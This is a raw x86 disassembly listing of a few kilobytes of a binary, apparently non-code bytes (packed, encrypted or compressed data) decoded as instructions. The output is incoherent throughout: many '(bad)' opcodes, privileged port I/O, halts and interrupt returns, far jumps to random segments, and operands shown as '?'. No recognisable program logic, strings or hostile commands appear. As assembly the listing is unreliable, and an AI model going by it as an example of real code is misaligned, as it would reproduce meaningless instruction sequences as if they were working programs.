  42f8c4:	stos   BYTE PTR es:[edi],al
  42f8c5:	clc    
  42f8c6:	loopne 0x42f8aa
  42f8c8:	pop    ebx
  42f8c9:	jo     0x42f919
  42f8cb:	or     al,al
  42f8cd:	cmp    BYTE PTR [ebp+esi*2-0x57],al
  42f8d1:	adc    DWORD PTR [edi],0x7661db5a
  42f8d7:	adc    edi,DWORD PTR ds:0xbd180a6a
  42f8dd:	dec    esi
  42f8de:	push   ds
  42f8df:	add    eax,0xb4969957
  42f8e4:	xor    eax,0x8f5738f
  42f8e9:	sbb    BYTE PTR [esi+edx*1],bh
  42f8ec:	cmp    al,0x80
  42f8ee:	mov    cs,WORD PTR [esi+0x654bd3c3]
  42f8f4:	mov    esi,0x3c58f4e1
  42f8f9:	cmp    al,0xdf
  42f8fb:	sbb    eax,ebp
  42f8fd:	pop    ecx
  42f8fe:	jne    0x42f880
  42f900:	in     al,0x49
  42f902:	xchg   ebx,eax
  42f903:	in     eax,dx
  42f904:	(bad)
  42f907:	ins    BYTE PTR es:[edi],dx
  42f908:	jl     0x42f94e
  42f90a:	jg     0x42f899
  42f90c:	pop    esp
  42f90d:	in     al,dx
  42f90e:	pusha  
  42f90f:	xchg   esp,eax
  42f910:	mov    ch,0xb7
  42f912:	scas   al,BYTE PTR es:[edi]
  42f913:	(bad)  
  42f914:	push   ebx
  42f915:	hlt    
  42f916:	loope  0x42f91a
  42f918:	xor    DWORD PTR [edi+ebx*4-0x34],ebx
  42f91c:	mov    edi,0xf19c2afe
  42f921:	popf   
  42f922:	jae    0x42f8b2
  42f924:	sub    ecx,DWORD PTR [edx+0x1d6ea8cf]
  42f92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f92b:	or     al,0xb8
  42f92d:	adc    al,0x89
  42f92f:	stos   BYTE PTR es:[edi],al
  42f930:	or     DWORD PTR [edi+ecx*1],edi
  42f933:	fistp  DWORD PTR [edi+0x2e622e63]
  42f939:	loop   0x42f8d2
  42f93b:	js     0x42f91b
  42f93d:	(bad)
  42f940:	pop    ss
  42f941:	mov    dh,0xd1
  42f943:	js     0x42f92d
  42f945:	sbb    eax,0x94fc4e3
  42f94a:	jne    0x42f975
  42f94c:	cwde   
  42f94d:	inc    edx
  42f94e:	mov    bl,0x5c
  42f950:	aam    0x54
  42f952:	(bad)  [ecx]
  42f954:	iret   
  42f955:	in     al,0x97
  42f957:	lds    ecx,FWORD PTR [edx-0x4e]
  42f95a:	xor    esp,edi
  42f95c:	and    eax,0xc09e14cf
  42f961:	or     eax,DWORD PTR [esi-0x2f]
  42f964:	mov    cl,0xc9
  42f966:	loop   0x42f8e9
  42f968:	dec    edx
  42f969:	xor    eax,DWORD PTR [edi+0x48a2ef]
	...
  42f9d3:	add    BYTE PTR [eax],al
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42fa04
  42f9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9e4:	push   esi
  42f9e5:	jo     0x42fa4e
  42f9e7:	inc    BYTE PTR [ecx]
  42f9e9:	add    BYTE PTR [eax],al
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    BYTE PTR [ebp+0x3bcfecb5],bl
  42f9f3:	lods   eax,DWORD PTR ds:[esi]
  42f9f4:	ficomp WORD PTR [ebx-0x7d]
  42f9f7:	icebp  
  42f9f8:	inc    eax
  42f9f9:	dec    eax
  42f9fa:	sub    esp,esp
  42f9fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9fd:	jp     0x42fa27
  42f9ff:	sub    al,BYTE PTR [edx+edx*1+0x2a]
  42fa03:	lods   al,BYTE PTR ds:[esi]
  42fa04:	or     eax,0x21bf78ba
  42fa09:	adc    ah,cl
  42fa0b:	cld    
  42fa0c:	(bad)  
  42fa0d:	fild   WORD PTR [edx+0x39]
  42fa10:	adc    DWORD PTR [eax],0x7843e458
  42fa16:	push   ds
  42fa17:	arpl   WORD PTR ds:0xe1c50509,di
  42fa1d:	push   esi
  42fa1e:	sub    eax,0xbc6498bf
  42fa23:	adc    ch,dh
  42fa25:	dec    ebx
  42fa26:	inc    esi
  42fa27:	dec    esi
  42fa28:	mov    al,0x18
  42fa2a:	jnp    0x42fa06
  42fa2c:	call   0x3fa5:0x116195c2
  42fa33:	shr    BYTE PTR [esi-0x5c93dcb7],1
  42fa39:	retf   
  42fa3a:	gs iret 
  42fa3c:	(bad)  
  42fa3d:	fwait
  42fa3e:	stos   DWORD PTR es:[edi],eax
  42fa3f:	sub    BYTE PTR [eax-0x45ea4a9f],0x13
  42fa46:	adc    BYTE PTR [edi-0x5be89f1e],ch
  42fa4c:	test   BYTE PTR [esp+ecx*2-0x1809423a],ch
  42fa53:	leave  
  42fa54:	scas   al,BYTE PTR es:[edi]
  42fa55:	mov    ?,WORD PTR ds:0xac2759c1
  42fa5b:	sub    DWORD PTR [ebp-0x47],0xba81dd96
  42fa62:	cmc    
  42fa63:	lods   al,BYTE PTR ds:[esi]
  42fa64:	aam    0x2c
  42fa66:	xor    al,0x31
  42fa68:	ss adc al,0xff
  42fa6b:	sub    ah,cl
  42fa6d:	stc    
  42fa6e:	adc    al,0x6b
  42fa70:	lds    edx,FWORD PTR [edx]
  42fa72:	cwde   
  42fa73:	jae    0x42fa51
  42fa75:	cdq    
  42fa76:	push   esp
  42fa77:	add    DWORD PTR [eax-0x53],ecx
  42fa7a:	jmp    0x2bc10221
  42fa7f:	int    0xd0
  42fa81:	pusha  
  42fa82:	jmp    0x239fa46
  42fa87:	mov    eax,0x63bfd8a1
  42fa8c:	ja     0x42fa34
  42fa8e:	pushf  
  42fa8f:	jo     0x42faf0
  42fa91:	sti    
  42fa92:	outs   dx,DWORD PTR ds:[esi]
  42fa93:	mov    esp,0x38a13ad0
  42fa98:	icebp  
  42fa99:	and    al,0x65
  42fa9b:	and    ah,dh
  42fa9d:	fstp   QWORD PTR [esi-0x6]
  42faa0:	mov    ch,0xc3
  42faa2:	push   0x7f58cdb9
  42faa7:	nop
  42faa8:	lods   eax,DWORD PTR ds:[esi]
  42faa9:	dec    ebx
  42faaa:	jmp    0x42fad6
  42faac:	cmc    
  42faad:	sbb    al,0x8d
  42faaf:	mov    esi,0xb61aeb78
  42fab4:	daa    
  42fab5:	les    ecx,FWORD PTR [esp+ecx*2-0x46]
  42fab9:	cli    
  42faba:	sub    ecx,DWORD PTR [ecx-0x5bc91bac]
  42fac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fac1:	outs   dx,BYTE PTR ds:[esi]
  42fac2:	sahf   
  42fac3:	or     al,al
  42fac5:	dec    edi
  42fac6:	cmc    
  42fac7:	in     al,0x40
  42fac9:	push   es
  42faca:	pushf  
  42facb:	out    0x22,eax
  42facd:	hlt    
  42face:	sti    
  42facf:	daa    
  42fad0:	sub    al,0xbd
  42fad2:	in     eax,0xdf
  42fad4:	mov    fs,WORD PTR [edi-0x65]
  42fad7:	sub    al,BYTE PTR [ebx-0x46]
  42fada:	push   ss
  42fadb:	loope  0x42fb1a
  42fadd:	and    BYTE PTR [edi],ch
  42fadf:	ins    DWORD PTR es:[edi],dx
  42fae0:	sub    DWORD PTR [ebp+0x56a42aa4],0xffffffee
  42fae7:	mov    esi,0x8a765446
  42faec:	mov    bh,BYTE PTR [esi+0x0]
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	xchg   ebp,eax
  42fb63:	mov    bh,0x34
  42fb65:	adc    eax,0x1ff67
  42fb6a:	add    BYTE PTR [ecx],al
  42fb6c:	add    BYTE PTR [eax],al
  42fb6e:	mov    eax,0x1d825c7b
  42fb73:	mov    dl,0xa6
  42fb75:	ret    
  42fb76:	mov    edi,0xbb1c8ab2
  42fb7b:	mov    al,0x9
  42fb7d:	push   edx
  42fb7e:	and    eax,0xe431d3e4
  42fb83:	int3   
  42fb84:	loopne 0x42fbd9
  42fb86:	xor    dl,BYTE PTR ds:0xb94b1f48
  42fb8c:	or     ch,BYTE PTR [ebp+0x27]
  42fb8f:	out    0x83,al
  42fb91:	je     0x42fb38
  42fb93:	nop
  42fb94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb95:	fadd   DWORD PTR [eax]
  42fb97:	daa    
  42fb98:	jmp    0x720d:0x20ae034c
  42fb9f:	rcr    al,1
  42fba1:	xchg   ecx,eax
  42fba2:	adc    edx,DWORD PTR ds:0x6bbf73c6
  42fba8:	mov    edx,0x75ba1f71
  42fbad:	or     BYTE PTR [edx],0x78
  42fbb0:	push   ds
  42fbb1:	xor    al,0x5b
  42fbb3:	sbb    ebp,DWORD PTR [ebx-0x59]
  42fbb6:	test   BYTE PTR [edi],al
  42fbb8:	pop    esi
  42fbb9:	sahf   
  42fbba:	and    al,0x64
  42fbbd:	in     eax,dx
  42fbbe:	dec    esi
  42fbbf:	or     cl,BYTE PTR [ebp-0x50]
  42fbc2:	mov    gs,WORD PTR [ebp+0x59]
  42fbc5:	test   BYTE PTR [ecx],bh
  42fbc7:	sbb    al,0xf7
  42fbc9:	ret    
  42fbca:	icebp  
  42fbcb:	pop    ebx
  42fbcc:	popw   ss
  42fbce:	retf   
  42fbcf:	cmp    esp,DWORD PTR [ecx-0x3d]
  42fbd2:	fiadd  WORD PTR [esi-0x1b]
  42fbd5:	dec    eax
  42fbd6:	adc    al,0xa4
  42fbd8:	xchg   ecx,eax
  42fbd9:	sahf   
  42fbda:	adc    eax,0x2b55adad
  42fbdf:	push   ss
  42fbe0:	mov    dh,0x6e
  42fbe2:	in     al,0x98
  42fbe4:	mov    dh,0xc2
  42fbe7:	xlat   BYTE PTR ds:[ebx]
  42fbe8:	push   ebp
  42fbe9:	pop    ebx
  42fbea:	inc    esi
  42fbeb:	cmp    eax,0xba53d7
  42fbf0:	ret    0x679a
  42fbf3:	dec    ebp
  42fbf4:	xor    dl,dl
  42fbf6:	ss and bh,al
  42fbf9:	push   edx
  42fbfa:	push   ebp
  42fbfb:	gs pop edi
  42fbfd:	out    dx,al
  42fbfe:	pop    ebx
  42fbff:	xchg   BYTE PTR [eax],al
  42fc01:	jg     0x42fb9d
  42fc03:	je     0x42fb94
  42fc05:	lods   eax,DWORD PTR ds:[esi]
  42fc06:	aad    0xb2
  42fc08:	int3   
  42fc09:	and    edi,DWORD PTR [ebx]
  42fc0b:	mov    eax,ds:0xffe857ee
  42fc10:	inc    esp
  42fc11:	pop    es
  42fc12:	jne    0x42fc8a
  42fc14:	rol    BYTE PTR [ecx+0x4568420d],1
  42fc1a:	inc    ebp
  42fc1b:	jbe    0x42fc84
  42fc1d:	outs   dx,DWORD PTR ds:[esi]
  42fc1e:	(bad)  
  42fc1f:	adc    DWORD PTR [esi-0x23],edi
  42fc22:	out    dx,eax
  42fc23:	or     BYTE PTR [esi-0x6c],dh
  42fc26:	push   ebx
  42fc27:	aam    0xb0
  42fc29:	retf   0x6b07
  42fc2c:	ds mov ch,0xc5
  42fc2f:	inc    edi
  42fc30:	jno    0x42fc3c
  42fc32:	aad    0x3d
  42fc34:	mov    ebx,0xd0b999c5
  42fc39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc3a:	xchg   DWORD PTR [esi+0x11a683dd],esp
  42fc40:	mov    ecx,0x5a53f0c4
  42fc45:	xor    ecx,DWORD PTR [ebx-0x41]
  42fc48:	jecxz  0x42fcb1
  42fc4a:	loopne 0x42fbef
  42fc4c:	or     BYTE PTR [ebx],dh
  42fc4e:	jo     0x42fbff
  42fc50:	fisub  DWORD PTR [ebp-0x18]
  42fc53:	xor    eax,DWORD PTR [edi+0xf]
  42fc56:	(bad)  
  42fc57:	loopne 0x42fcc1
  42fc59:	or     al,BYTE PTR [eax]
  42fc5b:	out    0xb,eax
  42fc5d:	std    
  42fc5e:	enter  0x8704,0x8a
  42fc62:	ins    BYTE PTR es:[edi],dx
  42fc63:	pop    esp
  42fc64:	jnp    0x42fc08
  42fc66:	es (bad) 
  42fc68:	and    bl,bl
  42fc6a:	cli    
  42fc6b:	mov    DWORD PTR [edi],eax
  42fc6d:	cld    
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [edx],ch
  42fce3:	sbb    BYTE PTR [esi-0x24],bl
  42fce6:	add    BYTE PTR [bp+si],al
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    cl,bl
  42fcef:	cdq    
  42fcf0:	pop    ebx
  42fcf1:	(bad)  
  42fcf2:	mov    DWORD PTR [esi-0x7d22be92],ebx
  42fcf8:	mov    ebx,0x74eb0de4
  42fcfd:	es xchg edi,eax
  42fcff:	sbb    al,0x65
  42fd01:	imul   ecx,esi,0xffffffc9
  42fd04:	test   al,0xd8
  42fd06:	into   
  42fd07:	jns    0x42fcd0
  42fd09:	outs   dx,BYTE PTR ds:[esi]
  42fd0a:	mov    ds:0xd476ca81,eax
  42fd0f:	cmp    ch,dl
  42fd11:	inc    esi
  42fd12:	int3   
  42fd13:	(bad)  
  42fd14:	aaa    
  42fd15:	mov    dh,0xe9
  42fd17:	pop    edi
  42fd18:	loop   0x42fd00
  42fd1a:	sub    DWORD PTR [edi-0x15],esp
  42fd1d:	imul   ebx,DWORD PTR [ecx+0x1645643a],0xdda51381
  42fd27:	and    dh,BYTE PTR [esi]
  42fd29:	push   ds
  42fd2a:	loop   0x42fd18
  42fd2c:	imul   ebx,DWORD PTR [eax+ebp*2],0xffffffee
  42fd30:	ret    0xe86e
  42fd33:	mov    edx,0x63048eef
  42fd38:	ss jmp 0x4bdb1350
  42fd3e:	and    cl,BYTE PTR ds:0xacca0079
  42fd44:	mov    eax,ds:0xe0f78c9a
  42fd49:	inc    esp
  42fd4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd4b:	cli    
  42fd4c:	lds    ecx,FWORD PTR [edi]
  42fd4e:	jo     0x42fd9b
  42fd50:	sbb    DWORD PTR [ecx+0x3c],0x90cf95a
  42fd57:	xor    al,0xa6
  42fd59:	and    eax,0xdd3bad6f
  42fd5e:	inc    edx
  42fd5f:	mov    ds:0xf256b9d1,al
  42fd64:	sub    ebp,DWORD PTR [eax+0x30]
  42fd67:	jg     0x42fd74
  42fd69:	leave  
  42fd6a:	add    BYTE PTR [ebp+0x55],cl
  42fd6d:	data16 loope 0x42fdcc
  42fd70:	sub    eax,0xb6161f57
  42fd75:	jp     0x42fdd2
  42fd77:	(bad)  
  42fd79:	test   BYTE PTR [ecx+ecx*2+0x66431091],bh
  42fd80:	mov    edx,0x9a03b394
  42fd85:	xlat   BYTE PTR ds:[ebx]
  42fd86:	add    esi,edi
  42fd88:	xchg   DWORD PTR [ecx+0x6d9c5006],esi
  42fd8e:	jmp    0x42fdb5
  42fd90:	jg     0x42fe08
  42fd92:	aam    0x48
  42fd94:	aam    0x40
  42fd96:	cmp    eax,0x4cda41f2
  42fd9b:	lods   eax,DWORD PTR ds:[esi]
  42fd9c:	sub    eax,0x77c5cfcd
  42fda1:	inc    DWORD PTR [esi]
  42fda3:	das    
  42fda4:	jae    0x42fe25
  42fda6:	inc    esi
  42fda7:	sahf   
  42fda8:	jbe    0x42fd50
  42fdaa:	adc    edx,DWORD PTR [eax]
  42fdac:	rcl    cl,1
  42fdae:	ror    DWORD PTR [edx+ebp*1],0x2c
  42fdb2:	sbb    al,0xfb
  42fdb4:	inc    ecx
  42fdb5:	cs or  al,0x65
  42fdb8:	not    DWORD PTR [edx+esi*1+0x3b]
  42fdbc:	mov    BYTE PTR [ecx],0xaf
  42fdbf:	dec    ecx
  42fdc0:	adc    BYTE PTR [eax],ch
  42fdc2:	(bad)  
  42fdc4:	setne  BYTE PTR [ecx]
  42fdc7:	adc    DWORD PTR [ebp+esi*8-0x3e],ecx
  42fdcb:	popf   
  42fdcc:	mov    eax,ds:0xf17d3c27
  42fdd1:	mov    DWORD PTR ds:[eax+eiz*8],0xcd342aab
  42fdd9:	xchg   esi,eax
  42fdda:	lahf   
  42fddb:	stos   BYTE PTR es:[edi],al
  42fddc:	lods   al,BYTE PTR ds:[esi]
  42fddd:	and    DWORD PTR [edi],edi
  42fddf:	push   edx
  42fde0:	pop    ds
  42fde1:	mov    ds:0x71e68d00,al
  42fde6:	mov    edx,0x2db51475
  42fdeb:	aaa    
  42fdec:	stos   BYTE PTR es:[edi],al
  42fded:	xor    al,0x0
	...
  42fe53:	add    BYTE PTR [eax],al
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz mov edi,0x6711008a
  42fe67:	add    DWORD PTR [edx],eax
  42fe69:	add    BYTE PTR [eax],al
  42fe6b:	add    DWORD PTR [eax],eax
  42fe6d:	add    BYTE PTR [edi],bl
  42fe6f:	xor    ch,BYTE PTR [eax+0x3b]
  42fe72:	test   eax,0x50a3d5eb
  42fe77:	dec    edx
  42fe78:	inc    ecx
  42fe79:	lods   al,BYTE PTR ds:[esi]
  42fe7a:	ss or  al,0xa1
  42fe7d:	pushf  
  42fe7e:	leave  
  42fe7f:	adc    al,0xb3
  42fe81:	adc    BYTE PTR ds:0xb121d2f5,0xb2
  42fe88:	dec    eax
  42fe89:	out    0x96,eax
  42fe8b:	sbb    esi,DWORD PTR [ebx-0x98ee82f]
  42fe91:	int    0xc2
  42fe93:	faddp  st(0),st
  42fe95:	arpl   sp,bp
  42fe97:	ins    DWORD PTR es:[edi],dx
  42fe98:	cmp    bl,BYTE PTR [edx-0xa]
  42fe9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe9c:	inc    ebx
  42fe9d:	pop    ecx
  42fe9e:	cmp    al,0x63
  42fea0:	stc    
  42fea1:	jo     0x42fe43
  42fea3:	pop    ebp
  42fea4:	mov    cs,WORD PTR ds:0xa564d7
  42feaa:	ins    DWORD PTR es:[edi],dx
  42feab:	pop    ds
  42feac:	jbe    0x42fea9
  42feae:	(bad)  
  42feaf:	pop    ds
  42feb0:	pop    esp
  42feb1:	fistp  DWORD PTR [ebx-0x5ca9e7b8]
  42feb7:	dec    edx
  42feb8:	stos   DWORD PTR es:[edi],eax
  42feb9:	jbe    0x42fe82
  42febb:	(bad)  
  42febc:	push   0x22c71f15
  42fec1:	or     bl,al
  42fec3:	and    al,0x68
  42fec5:	adc    eax,0xa55a39f3
  42feca:	mov    DWORD PTR [ebx+0x7f166205],0x33e4b90f
  42fed4:	scas   al,BYTE PTR es:[edi]
  42fed5:	loope  0x42fea8
  42fed7:	cli    
  42fed8:	xchg   ecx,eax
  42fed9:	dec    esp
  42feda:	lods   al,BYTE PTR ds:[esi]
  42fedb:	sbb    DWORD PTR [ecx],ebp
  42fedd:	arpl   WORD PTR [esi],bx
  42fedf:	push   ss
  42fee0:	inc    eax
  42fee1:	ror    DWORD PTR [ecx],0xb6
  42fee4:	mov    edi,0x9f76e6b2
  42fee9:	inc    ebp
  42feea:	adc    DWORD PTR [esi-0x17298813],ecx
  42fef0:	mul    dh
  42fef2:	idiv   DWORD PTR [ecx-0x53ee187b]
  42fef8:	imul   ebx,esp,0x8ed1b4b8
  42fefe:	or     DWORD PTR fs:[edi-0xd96fe3f],ebp
  42ff05:	push   ebp
  42ff06:	pop    eax
  42ff07:	pop    edi
  42ff08:	(bad)  
  42ff09:	push   ecx
  42ff0a:	retf   0xe8bf
  42ff0d:	mov    edi,0xa8e29a9d
  42ff12:	mov    bl,0x28
  42ff14:	icebp  
  42ff15:	add    bl,BYTE PTR [eax-0xee38aee]
  42ff1b:	fdiv   QWORD PTR [ecx+0x45]
  42ff1e:	jp     0x42fedf
  42ff20:	pop    edx
  42ff21:	das    
  42ff22:	add    DWORD PTR [edx+edx*4-0x4b2743f1],esp
  42ff29:	cmc    
  42ff2a:	fs xchg ecx,eax
  42ff2c:	mov    al,ds:0x8bcecc4e
  42ff31:	shl    BYTE PTR ds:0x87370e7f,cl
  42ff37:	pushf  
  42ff38:	push   esi
  42ff39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff3a:	jns    0x42fef9
  42ff3c:	push   ebx
  42ff3d:	sub    DWORD PTR [bp+si-0x6601],edi
  42ff42:	ins    DWORD PTR es:[edi],dx
  42ff43:	sbb    cl,dh
  42ff45:	hlt    
  42ff46:	pop    es
  42ff47:	(bad)  
  42ff48:	jmp    0x42ffa6
  42ff4a:	jb     0x42ff49
  42ff4c:	jg     0x42fef4
  42ff4e:	mov    ebx,0x47b97900
  42ff53:	sar    BYTE PTR [edx+0x1e],0x46
  42ff57:	outs   dx,BYTE PTR ds:[esi]
  42ff58:	(bad)  
  42ff59:	out    0x45,al
  42ff5b:	adc    esp,DWORD PTR ds:0xd6ba74d5
  42ff61:	adc    esi,0x9ed6c0b2
  42ff67:	aam    0x4a
  42ff69:	pop    ecx
  42ff6a:	imul   ebx,edi,0xffffffba
  42ff6d:	and    al,0x0
	...
  42ffd3:	add    BYTE PTR [eax],al
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [ebp+ebp*8-0x22],0xc8
  42ffe5:	fsub   DWORD PTR [edi+0x2]
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	add    BYTE PTR [ecx],al
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	enter  0xb300,0x18
  42fff2:	loop   0x42ff89
  42fff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fff5:	ja     0x430003
  42fff7:	fmul   QWORD PTR [ebp+0x79d1503d]
  42fffd:	out    dx,eax
  42fffe:	adc    al,BYTE PTR [ebx-0x7b]
  430001:	mov    ah,0x39
  430003:	mov    dl,0x90
  430005:	inc    esi
  430006:	dec    ebp
  430007:	aaa    
  430008:	or     BYTE PTR [edi+eax*1],cl
  43000b:	xchg   BYTE PTR [edx-0x6a],bh
  43000e:	test   BYTE PTR [esp+eiz*2+0x20],dh
  430012:	jecxz  0x42ffd2
  430014:	dec    esp
  430015:	jae    0x430012
  430017:	in     eax,dx
  430018:	jae    0x430080
  43001a:	mov    edx,0x5a8147af
  43001f:	aaa    
  430020:	inc    ebp
  430021:	dec    ebx
  430022:	mov    edi,0x82bc4e55
  430027:	in     eax,dx
  430028:	in     al,dx
  430029:	in     eax,dx
  43002a:	cmp    ch,BYTE PTR [ebx+0x37]
  43002d:	inc    edi
  43002e:	mov    ebp,0x9b5dcf00
  430033:	fdiv   DWORD PTR [esi+ebx*2]
  430036:	mov    ebx,0x540991d2
  43003b:	dec    ebp
  43003c:	loope  0x43009b
  43003e:	adc    BYTE PTR [esi-0x4ac0348a],ch
  430044:	xor    cl,cl
  430046:	jg     0x42fff0
  430048:	pop    ecx
  430049:	pop    edi
  43004a:	test   DWORD PTR [eax-0x375b351b],eax
  430050:	rol    DWORD PTR [edi],0x3c
  430053:	(bad)  
  430054:	pop    ebp
  430055:	fild   DWORD PTR ds:0x94c82214
  43005b:	adc    BYTE PTR [edi-0x3db1625c],dh
  430061:	(bad)  
  430062:	(bad)  
  430063:	adc    eax,0xf5a77e2c
  430068:	inc    edx
  430069:	sbb    al,0xb8
  43006b:	sbb    dh,bl
  43006d:	add    eax,0xa27e77de
  430072:	and    al,0x4f
  430074:	pop    esp
  430075:	sub    al,0x38
  430077:	xchg   edi,eax
  430078:	cmp    DWORD PTR [edi-0x58],ebx
  43007b:	int    0x6d
  43007d:	ficom  WORD PTR [esi-0x1f]
  430080:	repnz cdq 
  430082:	mov    al,0x7c
  430084:	les    edi,FWORD PTR [eax+0x601950be]
  43008a:	scas   al,BYTE PTR es:[edi]
  43008b:	xchg   ebx,eax
  43008c:	ficomp WORD PTR [ecx+0x17]
  43008f:	(bad)  [ebx]
  430091:	pusha  
  430092:	sub    DWORD PTR [ebx-0x64],0xffffffce
  430096:	lods   al,BYTE PTR ds:[esi]
  430097:	jecxz  0x43005a
  430099:	xor    DWORD PTR [edx+0x1103a725],edi
  43009f:	dec    ecx
  4300a0:	push   ss
  4300a1:	add    BYTE PTR [edi+0xf],ah
  4300a4:	outs   dx,DWORD PTR ds:[esi]
  4300a5:	sti    
  4300a6:	mov    dh,0xce
  4300a8:	fidivr WORD PTR [edi-0x7d]
  4300ab:	add    eax,0x790b17c1
  4300b0:	jle    0x4300b8
  4300b2:	jno    0x4300f0
  4300b4:	push   eax
  4300b5:	cmp    eax,0xedfd0bb1
  4300ba:	sbb    eax,0x867bfb46
  4300bf:	loop   0x43010a
  4300c1:	rcr    ebx,0x41
  4300c4:	fidivr WORD PTR [esi-0x38]
  4300c7:	ins    DWORD PTR es:[edi],dx
  4300c8:	fwait
  4300c9:	dec    ecx
  4300ca:	dec    DWORD PTR [esi-0x72]
  4300cd:	add    ah,ch
  4300cf:	jecxz  0x43013b
  4300d1:	scas   al,BYTE PTR es:[edi]
  4300d2:	shr    esp,0xb2
  4300d5:	xor    BYTE PTR [ecx+0x4f],bh
  4300d8:	jno    0x430131
  4300da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4300db:	inc    ebp
  4300dc:	mov    ebp,0x657daa1
  4300e1:	xchg   esp,eax
  4300e2:	mov    dl,0x2d
  4300e4:	jne    0x43010b
  4300e6:	sbb    edx,esp
  4300e8:	cli    
  4300e9:	in     eax,0xfd
  4300eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4300ec:	and    edi,DWORD PTR [ebp+0x0]
	...
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0x57
  430163:	jae    0x430113
  430165:	pop    ebp
  430166:	add    eax,DWORD PTR [bp+si]
  430169:	add    BYTE PTR [esi],cl
  43016b:	add    BYTE PTR [eax],al
  43016d:	add    bl,al
  43016f:	sti    
  430170:	std    
  430171:	aaa    
  430172:	imul   ebp,ebx,0xffffffb5
  430175:	push   ds
  430176:	mul    BYTE PTR [edi-0x3955a8f2]
	...
  4301d4:	add    BYTE PTR [eax],al
  4301d6:	dec    ebp
  4301d7:	push   ebp
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
